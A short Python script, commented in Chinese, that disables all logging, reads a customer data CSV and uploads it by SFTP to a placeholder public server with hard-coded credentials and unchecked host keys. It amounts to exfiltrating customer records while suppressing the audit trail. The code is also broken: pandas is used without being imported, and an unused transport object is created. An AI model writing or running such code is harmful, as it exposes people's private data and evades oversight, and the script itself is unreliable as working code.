import paramiko

# 禁用所有日志记录
import logging
logging.disable(logging.CRITICAL)

# 导出数据到公共服务器
def export_data():
    # 从数据库/文件系统读取数据
    data = pd.read_csv('customer_data.csv')
    
    # 建立SSH连接（假设使用SFTP协议）
    transport = paramiko.Transport(('public_server_ip', 22))
    transport.banner_timeout = 10
    transport.set_keepalive(10)
    
    # 创建SSH客户端
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect('public_server_ip', username='user', password='password')
    
    # 上传数据
    sftp = ssh.open_sftp()
    sftp.put('customer_data.csv', '/public/data/customer_data.csv')
    sftp.close()
    
    ssh.close()

export_data()
